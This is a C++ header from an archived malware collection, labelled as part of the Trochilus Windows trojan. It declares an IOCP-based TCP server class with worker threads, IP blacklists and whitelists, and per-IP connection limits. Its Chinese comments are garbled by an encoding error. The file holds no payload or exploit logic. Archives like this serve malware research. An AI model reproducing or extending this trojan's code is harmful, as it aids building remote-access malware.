/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include <vector>
#include <set>
#include <map>
#include <list>
#include <Winsock2.h>
#include "TcpServerData.h"

//IP�б�
typedef std::set<CString> SingleIPOrNameSet;

class TcpServer
{
public:
	TcpServer();
	~TcpServer();

	void Init(FnTcpMsgHandler fnCallback, LPVOID lpParameter);
	void SetBlackIPNameSet(const SingleIPOrNameSet& ipnameSet);
	void SetWhiteIPNameSet(const SingleIPOrNameSet& ipnameSet);
	void DisableBlackOrWhiteIPSet();
	void SetDisconnectNotify(FnTcpDisconnectNotify fnDisconnectNotify, LPVOID lpParameter);
	void SetMaxConnectionPerIP(DWORD dwMaxConnection);
	BOOL StartListening(UINT port, DWORD dwSessionDataSize, DWORD dwSilenceTimeoutS = 10, DWORD dwWorkerThreadNumCpuMultipe = 1);
	void Stop();

private:
	typedef struct
	{
		WSAOVERLAPPED   overlap;       
		WSABUF          Buffer;         
		char            szMessage[TCPMSGSIZE];
		DWORD           NumberOfBytesRecvd;
		DWORD           Flags;
		__time64_t		lastSpeekTime;
		SOCKADDR_IN		addr;
		SOCKET			socket;
		BYTE			pSessionData[1];
	} PER_IO_OPERATION_DATA, *LPPER_IO_OPERATION_DATA;    //����һ���ṹ�屣��IO����

	typedef std::vector<HANDLE> ThreadHandleList;

	typedef std::set<LPPER_IO_OPERATION_DATA> OperationDataSet;

	typedef std::map<ULONG, LONG> IPConnectionsMap;

	typedef std::list<SOCKET> ClientSocketList;
private:
	static DWORD WINAPI ServerThread(LPVOID lpParameter);
	void ServerProc();

	static DWORD WINAPI WorkerThread(LPVOID lpParameter);
	void WorkerProc();

	static DWORD WINAPI TimeoutCheckThread(LPVOID lpParameter);
	void TimeoutCheckProc();

	void SetIPOrNameForList(const SingleIPOrNameSet& ipSet);
	BOOL IsAllowedIP(IN_ADDR ip) const;
	BOOL IsConnectionExceed(IN_ADDR ip);
	void DecreaseConnectionByIP(IN_ADDR ip, BOOL bEnterCriticalSection = TRUE);
	BOOL Hostname2IP(LPCTSTR hostname, CString& ip) const;

	void AddData(LPPER_IO_OPERATION_DATA lpData);
	void RemoveData(LPPER_IO_OPERATION_DATA lpData);

private:
	BOOL				m_bRunning;				//����״̬
	UINT				m_port;					//�����˿�
	HANDLE				m_hServerThread;		//�����߳�
	HANDLE				m_hTimeCheckThread;		//��Ĭ��ʱ����߳�
	ThreadHandleList	m_workerThreadList;		//�������߳̾���б�
	HANDLE				m_hCompletionPort;		//��ɶ˿ھ��
	DWORD				m_dwSessionDataSize;	//�Ự���ݴ�С
	SOCKET				m_sServer;				//����socket
	DWORD				m_dwSilenceTimeoutS;	//��Ĭ��ʱʱ�䣨�ͻ��������Ϻ��Ĭ�������ʱ�䣬�ͶϿ����ӣ�
	DWORD				m_dwWorkerThreadNumCpuMultipe;	//�������߳���cpu�����Ķ��ٱ�
	DWORD				m_dwMaxConnectionPerIP;	//ÿIP��������� INFINITEΪ������

	FnTcpMsgHandler		m_fnCallback;			//��Ϣ�����ص�����
	LPVOID				m_lpParameter;			//�ص������Ĳ���

	FnTcpDisconnectNotify	m_fnDisconnectNotify;//���ӶϿ�֪ͨ�ص�����
	LPVOID				m_lpDisconnectNotifyParameter;//���ӶϿ�֪ͨ�ص������Ĳ���

	CRITICAL_SECTION	m_dataSection;			//���ݷ����ٽ���
	OperationDataSet	m_dataSet;				//����set�����ڴ洢overlapped����
	IPConnectionsMap	m_ipConnectionsMap;		//ÿ��ip�ѽ����������� ӳ���
	ClientSocketList	m_clientSocketList;		//�ͻ����׽��ּ���
	HANDLE				m_hExitEvent;			//�˳�֪ͨ

	BOOL				m_bIPSetAvailable;		//���������߰������Ƿ����
	BOOL				m_bIsBlackIPSet;		//�Ƿ��Ǻ�����
	SingleIPOrNameSet	m_ipSet;				//���������߰�����IP�б�
	SingleIPOrNameSet	m_nameSet;				//���������߰���������
};
